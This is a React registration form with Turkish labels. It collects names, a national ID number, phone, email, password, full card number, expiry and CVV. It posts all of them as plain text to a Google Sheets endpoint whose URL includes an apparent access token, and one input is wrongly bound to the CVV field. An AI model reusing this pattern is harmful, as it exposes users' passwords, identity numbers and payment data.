import React, { useState } from "react";
import { Form, Input, Button, message } from "antd";
import axios from "axios";

const Register = ({ onOk }) => {
  const [formData, setFormData] = useState({
    kullanici_ad: "",
    kullanici_soyad: "",
    kimlik_no: "",
    tel_no: "",
    sifre: "",
    mail: "",
    kart_no:"",
    kart_ay:"",
    kart_yıl:"",
    kart_cvv:"",
  });

  const addData = () => {
    axios({
      method: "post",
      url: "https://v1.nocodeapi.com/yedekhesap/google_sheets/StIYAOTjYArHcRUE?tabId=sayfa1",
      data: [Object.values(formData)],
    })
      .then((response) => {
        // Registration successful
        message.success("Kayıt İşlemi Başarılı!");
        onOk(formData.kullanici_ad); // Pass kullanici_ad to onOk function
        setFormData({
          kullanici_ad: "",
          kullanici_soyad: "",
          kimlik_no: "",
          tel_no: "",
          sifre: "",
          mail: "",
          kart_no: "",
          kart_ay:"",
          kart_yıl:"",
          kart_cvv:"",
        });
      })
      .catch((error) => {
        // Registration failed
        message.error("Registration failed");
      });
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  return (
    <Form layout="vertical">
      <Form.Item
        label="Kullanıcı Adı"
        name="kullanici_ad"
        rules={[
          { required: true, message: "Lütfen kullanıcı adınızı giriniz!" },
          {
            pattern: /^[A-Za-zğüşöçıİĞÜŞÖÇ\s]+$/,
            message: "Kullanıcı adınız sadece harflerden oluşmalıdır!",
          },
        ]}
      >
        <Input
          name="kullanici_ad"
          value={formData.kullanici_ad}
          onChange={handleChange}
        />
      </Form.Item>
      <Form.Item
        label="Kullanıcı Soyadı"
        name="kullanici_soyad"
        rules={[
          { required: true, message: "Lütfen soyadınızı giriniz!" },
          {
            pattern: /^[A-Za-zğüşöçıİĞÜŞÖÇ\s]+$/,
            message: "Soyadınız sadece harflerden oluşmalıdır!",
          },
        ]}
      >
        <Input
          name="kullanici_soyad"
          value={formData.kullanici_soyad}
          onChange={handleChange}
        />
      </Form.Item>
      <Form.Item
        label="Kimlik Numarası"
        name="kimlik_no"
        rules={[
          {
            required: true,
            message: "Lütfen kimlik numaranızı giriniz!",
            max: 11,
            pattern: /^[0-9]{11}$/,
          },
        ]}
      >
        <Input
          name="kimlik_no"
          value={formData.kimlik_no}
          onChange={handleChange}
        />
      </Form.Item>
      <Form.Item
        label="Telefon Numarası"
        name="tel_no"
        rules={[
          {
            required: true,
            message: "Lütfen telefon numaranızı giriniz!",
            pattern: /^[0-9]{10}$/,
          },
        ]}
      >
        <Input name="tel_no" value={formData.tel_no} onChange={handleChange} />
      </Form.Item>
      <Form.Item
        label="Şifre"
        name="sifre"
        rules={[
          { required: true, message: "Lütfen şifrenizi giriniz!" },
          { min: 6, message: "Şifreniz en az 6 karakter olmalıdır!" },
        ]}
      >
        <Input.Password
          name="sifre"
          value={formData.sifre}
          onChange={handleChange}
        />
      </Form.Item>
      <Form.Item
        label="Mail Adresi"
        name="mail"
        rules={[
          {
            type: "email",
            message: "Lütfen geçerli bir email adresi giriniz!",
          },
          { required: true, message: "Lütfen email adresinizi giriniz!" },
        ]}
      >
        <Input name="mail" value={formData.mail} onChange={handleChange} />
      </Form.Item>
      <Form.Item
        label="Kart Numarası"
        name="kart_no"
        rules={[{ required: true, message: "Kart Numaranızı Girin!" },{ pattern: /^[0-9]{16}$/, message: "Geçersiz kart numarası!" },]}
      >
        <Input
          name="kart_no"
          value={formData.kart_no}
          onChange={handleChange}
        ></Input>
      </Form.Item>
      <Form.Item
        label="Kart Ay"
        name="kart_ay"
        rules={[{ required: true, message: "Kartınızın ay bilgisini girin!" },{ pattern: /^[0-9]{2}$/, message: "Geçersiz ay bilgisi!" },]}
      >
        <Input
        style={{width:"25%"}}
          name="kart_ay"
          value={formData.kart_ay}
          onChange={handleChange}
        ></Input>
      </Form.Item>
      <Form.Item
        label="Kart Yıl"
        name="kart_yıl"
        rules={[{ required: true, message: "Kartınızın yıl bilgisini girin!" },{ pattern: /^[0-9]{2}$/, message: "Geçersiz yıl bilgisi numarası!" },]}
      >
        <Input
        style={{width:"25%"}}
          name="kart_yıl"
          value={formData.kart_cvv}
          onChange={handleChange}
        ></Input>
      </Form.Item>
        <Form.Item
        label="Kart CVV"
        name="kart_cvv"
        rules={[{ required: true, message: "CVV bilgisini girin!" },{ pattern: /^[0-9]{3}$/, message: "Geçersiz CVV numarası!" },]}
      >
        <Input
        style={{width:"25%"}}
          name="kart_cvv"
          value={formData.kart_cvv}
          onChange={handleChange}
        ></Input>
      </Form.Item>
        <Button type="primary" onClick={addData}>
          Kaydet
        </Button>
    </Form>
  );
};

export default Register;
